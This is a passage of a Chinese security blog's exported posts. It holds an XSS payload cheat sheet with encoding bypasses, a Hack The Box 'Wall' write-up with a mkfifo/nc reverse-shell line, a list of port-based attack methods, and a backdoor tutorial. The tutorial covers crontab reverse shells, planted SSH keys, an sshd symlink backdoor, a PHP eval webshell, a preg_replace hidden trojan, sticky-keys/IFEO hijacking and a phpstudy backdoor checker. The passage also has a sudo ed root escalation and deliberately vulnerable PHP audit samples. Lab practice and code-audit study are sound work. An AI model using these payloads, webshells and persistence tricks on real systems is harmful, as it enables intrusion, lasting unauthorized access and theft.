mp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;XSS&lt;/a--&gt; &lt;!--弹窗--&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h2 id="0x02-常用"><a href="#0x02-常用" class="headerlink" title="0x02 常用"></a>0x02 常用</h2><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
&lt;svg/onload=alert(1)&gt;
&lt;img src=1 onerror=alert(1)&gt;
&lt;plaintext/onmouseover=prompt(1)&gt;
&lt;a onmouseover=alert(1)&gt;1&lt;/a&gt;
javascript:alert(1)</code></pre><h2 id="0x03-标签-元素"><a href="#0x03-标签-元素" class="headerlink" title="0x03 标签/元素"></a>0x03 <a href="https://www.runoob.com/tags/ref-byfunc.html" target="_blank" rel="noopener">标签/元素</a></h2><p><strong>空标签 即无关闭标签</strong></p>
<ul>
<li>&lt;area&gt;</li>
<li>&lt;base&gt;</li>
<li>&lt;br&gt;</li>
<li>&lt;col&gt;</li>
<li>&lt;colgroup&gt;</li>
<li>&lt;command&gt;</li>
<li>&lt;embed&gt;</li>
<li>&lt;hr&gt;</li>
<li>&lt;img&gt;</li>
<li>&lt;input&gt;</li>
<li>&lt;keygen&gt;</li>
<li>&lt;link&gt;</li>
<li>&lt;meta&gt;</li>
<li>&lt;param&gt;</li>
<li>&lt;source&gt;</li>
<li>&lt;track&gt;</li>
<li>&lt;wbr&gt;</li>
</ul>
<p><a href="https://www.jianshu.com/p/5a78a19f18bf" target="_blank" rel="noopener">各种标签分类</a></p>
<h2 id="0x04-事件"><a href="#0x04-事件" class="headerlink" title="0x04 事件"></a>0x04 事件</h2><ul>
<li>onclick</li>
<li>onload</li>
<li>onmouseover</li>
<li>onerror</li>
</ul>
<h2 id="0x05-函数"><a href="#0x05-函数" class="headerlink" title="0x05 函数"></a>0x05 函数</h2><ul>
<li>alert()</li>
<li>prompt()</li>
<li>confirm()</li>
<li>alert(String.fromCharCode(88,83,83))</li>
</ul>
<h2 id="0x06-闭合"><a href="#0x06-闭合" class="headerlink" title="0x06 闭合"></a>0x06 闭合</h2><pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><h2 id="0x07-大小写绕过"><a href="#0x07-大小写绕过" class="headerlink" title="0x07 大小写绕过"></a>0x07 大小写绕过</h2><pre><code>&lt;scRIpt&gt;ALert(1)&lt;/SCriPt&gt;</code></pre><h2 id="0x08-多标签绕过"><a href="#0x08-多标签绕过" class="headerlink" title="0x08 多标签绕过"></a>0x08 多标签绕过</h2><pre><code>&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/script&gt;
&lt;asd&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;/asd&gt;</code></pre><h2 id="0x09-各种编码与部分编码"><a href="#0x09-各种编码与部分编码" class="headerlink" title="0x09 各种编码与部分编码"></a>0x09 各种编码与部分编码</h2><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;XSS&lt;/a&gt; //URL编码:URL编码
&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%31%29&quot;&gt;XSS&lt;/a&gt; //HTML字符实体编码:URL编码
&lt;button onclick=&quot;confirm(&#39;7&amp;#39;);&quot;&gt;Button&lt;/button&gt; //HTML字符实体编码
&lt;button onclick=&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;/button&gt; //unicode编码</code></pre><p>javascript:alert(1)</p>
<pre><code>\u0061\u006c\u0065\u0072\u0074 //alert：[中文转Unicode](http://www.jsons.cn/unicode/)
%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34 //\u0061\u006c\u0065\u0072\u0074：[全字符URL编码](http://www.jsons.cn/urlencode/)
&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29; //javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1): [HTML实体](https://www.qqxiuzi.cn/bianma/zifushiti.php)
&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0036;&amp;#x0025;&amp;#x0033;&amp;#x0031;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0036;&amp;#x0025;&amp;#x0036;&amp;#x0033;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0036;&amp;#x0025;&amp;#x0033;&amp;#x0035;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0037;&amp;#x0025;&amp;#x0033;&amp;#x0032;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0037;&amp;#x0025;&amp;#x0033;&amp;#x0034;&amp;#x0028;&amp;#x0031;&amp;#x0029; //javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)：[中文转&amp;#XXXX](http://www.jsons.cn/unicode/)</code></pre><h2 id="0xF0-在线编码解码"><a href="#0xF0-在线编码解码" class="headerlink" title="0xF0 在线编码解码"></a>0xF0 在线编码解码</h2><ol>
<li><a href="https://www.qqxiuzi.cn/daohang.htm" target="_blank" rel="noopener">https://www.qqxiuzi.cn/daohang.htm</a></li>
<li><a href="http://www.jsons.cn/" target="_blank" rel="noopener">http://www.jsons.cn/</a></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Wall</title>
    <url>/HTB-Wall/</url>
    <content><![CDATA[<h2 id="0x00-有样学样"><a href="#0x00-有样学样" class="headerlink" title="0x00 有样学样"></a>0x00 有样学样</h2><ol>
<li>nmap扫描</li>
<li><img src="/HTB-Wall/1.png" alt></li>
<li>dirsearch目录扫描</li>
<li><img src="/HTB-Wall/2.png" alt></li>
<li>依次访问，<a href="http://10.10.10.157/monitoring/要登录" target="_blank" rel="noopener">http://10.10.10.157/monitoring/要登录</a></li>
<li><img src="/HTB-Wall/3.png" alt></li>
<li>爆破，没爆出来~</li>
<li>ssh爆破，账号admin,也没爆出来~</li>
<li>抓包看看</li>
<li><img src="/HTB-Wall/4.png" alt></li>
<li>换POST请求，响应200</li>
<li><img src="/HTB-Wall/5.png" alt></li>
<li>重定向到<a href="http://10.10.10.157/centreon/" target="_blank" rel="noopener">http://10.10.10.157/centreon/</a></li>
<li><img src="/HTB-Wall/6.png" alt></li>
<li>再扫目录</li>
<li><img src="/HTB-Wall/7.png" alt></li>
<li>一个后台登陆（centreon是开源的IT监控软件），登录，burpsuite爆破，不清楚账号密码，刚从<a href="http://10.10.10.157/monitoring/知道admin，默认账号为admin，爆出密码为password1" target="_blank" rel="noopener">http://10.10.10.157/monitoring/知道admin，默认账号为admin，爆出密码为password1</a></li>
<li><img src="/HTB-Wall/8.png" alt></li>
<li>查看版本</li>
<li><img src="/HTB-Wall/9.png" alt></li>
<li>搜索利用脚本</li>
<li><img src="/HTB-Wall/10.png" alt></li>
<li>利用脚本</li>
<li><img src="/HTB-Wall/11.png" alt></li>
<li>但等不到shell，查看脚本</li>
<li><img src="/HTB-Wall/12.png" alt></li>
<li>关键内容</li>
<li><img src="/HTB-Wall/13.png" alt></li>
<li>访问/main.get.php?p=60901，有一条配置，点击查看</li>
<li><img src="/HTB-Wall/14.png" alt></li>
<li>修改配置，让其命令执行</li>
<li><img src="/HTB-Wall/15.png" alt></li>
<li>保存即回显403</li>
<li><img src="/HTB-Wall/16.png" alt></li>
<li>添加${IFS}替换空格，保存没显示403</li>
<li><img src="/HTB-Wall/17.png" alt></li>
<li>修改利用脚本</li>
<li><img src="/HTB-Wall/18.png" alt></li>
<li>htb的内容</li>
<li>rm -f /tmp/t;mkfifo /tmp/t;cat /tmp/t|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 8888 &gt;/tmp/t</li>
<li>成功反弹shell</li>
<li><img src="/HTB-Wall/19.png" alt></li>
<li><img src="/HTB-Wall/20.png" alt></li>
<li>读user.txt，没权限</li>
<li><img src="/HTB-Wall/21.png" alt></li>
<li>搜索了suid二进制文件，发现screen-4.5.0，搜索screen相关利用脚本</li>
<li><img src="/HTB-Wall/27.png" alt></li>
<li>查看脚本，下载脚本，赋权，利用，失败~</li>
<li><img src="/HTB-Wall/28.png" alt></li>
<li>自主创建脚本文件libhax.c</li>
<li><img src="/HTB-Wall/22.png" alt></li>
<li>rootshell.c</li>
<li><img src="/HTB-Wall/23.png" alt></li>
<li>编译</li>
<li><img src="/HTB-Wall/24.png" alt></li>
<li>服务器下载文件</li>
<li><img src="/HTB-Wall/25.png" alt></li>
<li>使用screen提权</li>
<li><img src="/HTB-Wall/26.png" alt></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://0xrick.github.io/hack-the-box/wall/" target="_blank" rel="noopener">https://0xrick.github.io/hack-the-box/wall/</a></p>
]]></content>
      <tags>
        <tag>HTB</tag>
        <tag>靶机</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>各端口服务漏洞</title>
    <url>/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="端口——端口服务——攻击方式"><a href="#端口——端口服务——攻击方式" class="headerlink" title="端口——端口服务——攻击方式"></a>端口——端口服务——攻击方式</h2><ol>
<li>20——FTP（文件传输协议，数据端口）——</li>
<li>21——FTP（文件传输协议，控制端口）——匿名访问（账号anonymous，密码空）、弱口令、字典爆破、软件漏洞</li>
<li>22——SSH——弱口令、28退格漏洞、openssl漏洞</li>
<li>23——telnet——弱口令、内网嗅探</li>
<li>25——</li>
<li>53——DNS：域名服务——DNS域传送、DNS劫持、DNS缓存投毒、DNS欺骗、利用DNS隧道技术穿透防火墙</li>
<li>69——tftp——</li>
<li>137——Samba（NetBIOS Name Service）——远程代码执行CVE-2015-0240、未授权访问</li>
<li>139——Samba（NetBIOS Session Service）——</li>
<li>389——LDAP：（默认）轻量级目录访问协议——盲注、未授权访问、弱口令、字典爆破</li>
<li>636——LDAP：（加密）轻量级目录访问协议</li>
<li>2049——NFS（网络文件系统），允许网络中的计算机通过TCP/IP网络共享资源——未授权访问</li>
<li>3389——RDP——爆破、5次shift后门、各种RCE</li>
<li>5900——VNC——弱口令、爆破、认证口令绕过、拒绝服务（CVE-2015-5239）、提权（CVE-2013-6886）</li>
<li>5901——VNC（桌面ID）</li>
<li>5902——VNC（桌面ID）</li>
</ol>
]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>backdoors</title>
    <url>/backdoors/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><ol>
<li>backdoor，后门。</li>
<li>从终端角度：IOT型，Linux型，windows型等</li>
<li>从Linux角度：配置型，logger型，rookit型等</li>
<li>从windows角度：registry型，schtasks型，WMI型等</li>
<li>从通信角度：irc型，dns型，icmp型，http/https型等</li>
<li>从网站应用角度：网站语言型，模块扩展型，配置文件型等</li>
</ol>
<h2 id="0x10-Linux-backdoors"><a href="#0x10-Linux-backdoors" class="headerlink" title="0x10 Linux_backdoors"></a>0x10 Linux_backdoors</h2><h3 id="crontab后门"><a href="#crontab后门" class="headerlink" title="crontab后门"></a>crontab后门</h3><ol>
<li>crontab文件的格式：</li>
<li><img src="/backdoors/8.png" alt></li>
<li>0 0 * * * /root/backdoor.sh #每天00:00执行一次backdoor.sh任务</li>
<li>00 12 * * 1,2,3,4,5 /root/backdoor.sh #周一至周五，12时00分执行一次任务</li>
<li>00 12 * * 1-5 /root/backdoor.sh #周一至周五，12时00分执行一次任务</li>
<li>*/10 * * * * /root/backdoor.sh #每10分钟执行一次任务</li>
<li>30 12 1 * * /root/backdoor.sh #每个月一号12时30分执行一次任务</li>
<li>crontab -e #修改crontab文件，无就新建</li>
<li>crontab -l #列出crontab文件</li>
<li><img src="/backdoors/11.png" alt></li>
<li>crontab -r #删除crontab文件</li>
<li><strong>类似的文件或目录：</strong></li>
<li>crontab，cron.d，cron.daily，cron.hourly，cron.monthly，cron.weekly</li>
<li><strong>例子:</strong></li>
<li>crontab -e #查看crontab文件，空白即无，新建</li>
<li><img src="/backdoors/9.png" alt></li>
<li>backdoor的内容</li>
<li><img src="/backdoors/10.png" alt></li>
<li>service crond restart #重启服务，然后等2分钟，shell就反连过来。</li>
<li><img src="/backdoors/12.png" alt></li>
</ol>
<h3 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h3><ol>
<li>本地主机生成的ssh公钥写到控制的服务器的~/.ssh/authorized_keys中，然后利用私钥完成认证登录。</li>
<li>本地生成公钥与私钥，上传公钥到服务器</li>
<li><img src="/backdoors/13.png" alt></li>
<li><img src="/backdoors/14.png" alt></li>
<li>修改ssh配置文件，保存，重启服务</li>
<li><img src="/backdoors/15.png" alt></li>
<li>systemctl restart sshd 或者 service sshd restart</li>
<li><strong>Linux私钥登录ssh</strong></li>
<li><img src="/backdoors/16.png" alt></li>
</ol>
<h3 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h3><ol>
<li>服务器建立软连接</li>
<li>ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12345</li>
<li>ssh root:qweasd@IP -p 12345</li>
</ol>
<h2 id="web-backdoors"><a href="#web-backdoors" class="headerlink" title="web_backdoors"></a>web_backdoors</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ol>
<li>例子：网站目录下保留php木马文件</li>
<li><?php @eval($_POST['!Qa2Ws#']);?> </li>
<li></li>
<li>使用网站的文件包含漏洞，或者创建文件包含漏洞：</li>
<li>test.php：<?php include "test1.txt"?></li>
<li>test1.txt：<?php phpinfo();?> #代码随意</li>
<li><img src="/backdoors/1.png" alt></li>
<li>包含任意文件：</li>
<li>&lt;?php </li>
<li>if(isset($_GET[file])){</li>
<li>include($_GET[‘file’]);</li>
<li>}</li>
<li>?&gt;</li>
<li><img src="/backdoors/2.png" alt></li>
</ol>
<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><ol>
<li>copy 1.png/b+shell.php test.png</li>
<li><img src="/backdoors/3.png" alt></li>
<li><img src="/backdoors/4.png" alt></li>
<li>通过文件包含漏洞</li>
<li><img src="/backdoors/5.png" alt></li>
</ol>
<h3 id="隐藏木马"><a href="#隐藏木马" class="headerlink" title="隐藏木马"></a>隐藏木马</h3><ol>
<li>preg_replace()函数</li>
<li><img src="/backdoors/6.png" alt></li>
<li>/e 修正符使preg_replace()将replacement参数当作PHP代码</li>
<li>&lt;?php</li>
<li>@preg_replace(“/Access/e”,$_GET[“pass”],”Access denied”);</li>
<li>?&gt;</li>
<li><img src="/backdoors/7.png" alt></li>
<li></li>
</ol>
<h3 id="对木马文件加密处理"><a href="#对木马文件加密处理" class="headerlink" title="对木马文件加密处理"></a>对木马文件加密处理</h3><h3 id="对木马文件变异加密处理"><a href="#对木马文件变异加密处理" class="headerlink" title="对木马文件变异加密处理"></a>对木马文件变异加密处理</h3><h2 id="0x-windows-backdoors"><a href="#0x-windows-backdoors" class="headerlink" title="0x windows_backdoors"></a>0x windows_backdoors</h2><h3 id="辅助功能映像劫持"><a href="#辅助功能映像劫持" class="headerlink" title="辅助功能映像劫持"></a>辅助功能映像劫持</h3><ol>
<li><a href="https://support.microsoft.com/zh-cn/help/13810/windows-keyboard-shortcuts-accessibility" target="_blank" rel="noopener">windows辅助功能</a>：为了易于访问与使用，添加一些辅助功能，在登录之前以结合键启动。</li>
<li>粘滞键（C:\Windows\System32\sethc.exe）：按5次shift</li>
<li>设置中心（C:\Windows\System32\utilman.exe）：windows+U</li>
<li><img src="/backdoors/22.png" alt></li>
<li>低版本的windows可以直接把sethc.exe替换成后门程序，windows Vista或windows server 2008及以上版本的会受到系统的保护。</li>
<li>映像劫持（Image File Execution Options）：当目标程序被映像劫持时，双击目标程序，系统会转而运行劫持程序，并不会运行目标程序。许多病毒会利用这一点来抑制杀毒软件的运行，并运行自己的程序。</li>
<li><strong>简单操作</strong></li>
<li>把C:\Windows\System32\cmd.exe重命名为C:\Windows\System32\sethc.exe（需要管理员权限）</li>
<li><img src="/backdoors/23.png" alt></li>
<li>锁屏状态下按5次shift</li>
<li><img src="/backdoors/24.png" alt></li>
<li>修改注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</li>
<li>如sethc.exe，无就添加新项，新建字符串值，名称为Debugger，数据值为C:\Windows\System32\cmd.exe</li>
<li><img src="/backdoors/25.png" alt></li>
<li><img src="/backdoors/24.png" alt></li>
</ol>
<p><strong>映像劫持防御</strong></p>
<ol>
<li>检查注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\下的程序名称以及数据与值。</li>
<li>设置权限，取消administrator和system等的写权限。</li>
<li>或者直接把HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\的Image File Execution Options删除。</li>
</ol>
<h2 id="0xFD-phpstudy后门"><a href="#0xFD-phpstudy后门" class="headerlink" title="0xFD phpstudy后门"></a>0xFD phpstudy后门</h2><ol>
<li>测试代码：echo “phpstudy_backdoor!”; </li>
<li>base64编码后：ZWNobyAicGhwc3R1ZHlfYmFja2Rvb3IhIjs=</li>
<li>burpsuite漏洞验证：</li>
<li><img src="/backdoors/17.png" alt></li>
<li>Python验证脚本（访问的目录或文件是存在的，不存在的文件就直接显示404）</li>
<li><img src="/backdoors/18.png" alt></li>
<li><img src="/backdoors/19.png" alt></li>
<li>命令执行验证，system(‘whoami’); base64编码 c3lzdGVtKCd3aG9hbWknKTs=</li>
<li><img src="/backdoors/20.png" alt></li>
<li><img src="/backdoors/21.png" alt></li>
</ol>
<h3 id="0xFE-phpstudy-backdoor"><a href="#0xFE-phpstudy-backdoor" class="headerlink" title="0xFE phpstudy_backdoor"></a>0xFE phpstudy_backdoor</h3><pre><code>#coding:utf-8
import requests
import sys

def exp(url):
    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0&#39;,&#39;Accept-Encoding&#39;:&#39;gzip,deflate&#39;,&#39;Accept-Charset&#39;:&#39;ZWNobyAicGhwc3R1ZHlfYmFja2Rvb3IhIjs=&#39;,&#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,&#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.5&#39;,&#39;Connection&#39;:&#39;close&#39;}
    try:
        r=requests.get(url,headers=headers)
        if &#39;phpstudy_backdoor!&#39; in r.text:
            print(&#39;phpstudy_backdoor!:   &#39;+url)
        else:
            print(&#39;None&#39;)
    except:
        pass

if __name__ == &#39;__main__&#39;:
    url=sys.argv[1]
    exp(url)</code></pre><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html" target="_blank" rel="noopener">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></li>
<li><a href="https://paper.seebug.org/1007/" target="_blank" rel="noopener">https://paper.seebug.org/1007/</a></li>
</ol>
<h2 id="0x"><a href="#0x" class="headerlink" title="0x"></a>0x</h2><p><a href="https://blog.csdn.net/bylfsj/article/details/102409951" target="_blank" rel="noopener">https://blog.csdn.net/bylfsj/article/details/102409951</a><br><a href="https://xz.aliyun.com/t/4090" target="_blank" rel="noopener">https://xz.aliyun.com/t/4090</a></p>
]]></content>
      <tags>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title>提权之Linux sudo-ed</title>
    <url>/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ol>
<li>环境：Ubuntu 14.04 x86</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/1.png" alt></li>
<li>命令：</li>
<li>$ sudo ed</li>
<li>: [输入当前用户的密码]</li>
<li>!/bin/sh</li>
<li># id</li>
<li># whoami #root</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/</a></li>
</ol>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计学习1</title>
    <url>/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/</url>
    <content><![CDATA[<h2 id="0x00-前面"><a href="#0x00-前面" class="headerlink" title="0x00 前面"></a>0x00 前面</h2><ol>
<li>不管怎样，不懂就按着师傅们的思路走，理解了，知识才是自己的，学习一波~</li>
</ol>
<h2 id="0x10-函数漏洞"><a href="#0x10-函数漏洞" class="headerlink" title="0x10 函数漏洞"></a>0x10 函数漏洞</h2><h3 id="0x11-in-array-函数缺陷"><a href="#0x11-in-array-函数缺陷" class="headerlink" title="0x11 in_array()函数缺陷"></a>0x11 in_array()函数缺陷</h3><ol>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/1.png" alt></li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/2.png" alt></li>
<li>漏洞原因：这里使用in_array()函数来检测上传文件的文件名，如果文件名前有数字n，则强制转换为数字n，符合范围的则返回true，否则false，（第三个参数为true则强制检查类型是否一致）。</li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/3.png" alt></li>
<li><strong>实例piwigo2.7.1</strong></li>
<li>漏洞入口在\picture.php</li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/4.png" alt></li>
<li>当参数action的值为rate时，就会调用文件include\functions_rate.inc.php中的方法rate_picture()</li>
<li>漏洞位置在include\functions_rate.inc.php中的方法rate_picture()</li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/5.png" alt></li>
<li>在111行，插入数据时，直接拼接$rate的。重点是42行的in_array()函数，里面有个$conf[‘rate_items’]，在config_default.inc.php中</li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/6.png" alt></li>
<li>这里没有把第三个参数设置为true，是弱比较，可以绕过。</li>
<li><strong>修复建议</strong></li>
<li>in_array(str,array,true) #设置第三个参数为true</li>
<li>使用正则来匹配变量</li>
<li>使用intval()函数来强制转换变量</li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/7.png" alt></li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/8.png" alt></li>
</ol>
<h3 id="0x12-filter-var-函数缺陷"><a href="#0x12-filter-var-函数缺陷" class="headerlink" title="0x12 filter_var()函数缺陷"></a>0x12 filter_var()函数缺陷</h3><ol>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/9.png" alt></li>
<li>这是PHP的一个模板引擎Twig，使用模板的escape和filter_var()函数进行过滤。</li>
<li>这里使用escape过滤link，实际是使用php内置函数htmlspecialchars来实现。</li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/10.png" alt></li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/11.png" alt></li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/12.png" alt></li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/13.png" alt></li>
<li><strong>修复建议</strong></li>
<li>过滤关键词，对特殊字符进行HTML实体编码替换。</li>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/14.png" alt></li>
</ol>
<h3 id="0x13-实例化任意对象漏洞"><a href="#0x13-实例化任意对象漏洞" class="headerlink" title="0x13 实例化任意对象漏洞"></a>0x13 实例化任意对象漏洞</h3><ol>
<li><img src="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/15.png" alt></li>
<li>存在两漏洞：文件包含漏洞、XXE</li>
</ol>
<h2 id="0xFE-代码"><a href="#0xFE-代码" class="headerlink" title="0xFE 代码"></a>0xFE 代码</h2><p><strong>Wish List</strong></p>
<pre><code>class Challenge {
  const UPLOAD_DIRECTORY = &#39;./solutions/&#39;;
  private $file;
  private $whitelist;

  public function __construct($file) {
    $this-&gt;file = $file;
    $this-&gt;whitelist = range(1, 24);
  }

  public function __destruct() {
    if (in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)) {
      move_uploaded_file(
        $this-&gt;file[&#39;tmp_name&#39;],
        self::UPLOAD_DIRECTORY . $this-&gt;file[&#39;name&#39;]
      );
    }
  }
}

$challenge = new Challenge($_FILES[&#39;solution&#39;]);</code></pre><p><strong>Twig</strong></p>
<pre><code>// composer require &quot;twig/twig&quot;
require &#39;vendor/autoload.php&#39;;

class Template {
  private $twig;

  public function __construct() {
    $indexTemplate = &#39;&lt;img &#39; .
      &#39;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#39; .
      &#39;&lt;a href=&quot;{{link|escape}}&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#39;;

    // Default twig setup, simulate loading
    // index.html file from disk
    $loader = new Twig\Loader\ArrayLoader([
      &#39;index.html&#39; =&gt; $indexTemplate
    ]);
    $this-&gt;twig = new Twig\Environment($loader);
  }

  public function getNexSlideUrl() {
    $nextSlide = $_GET[&#39;nextSlide&#39;];
    return filter_var($nextSlide, FILTER_VALIDATE_URL);
  }

  public function render() {
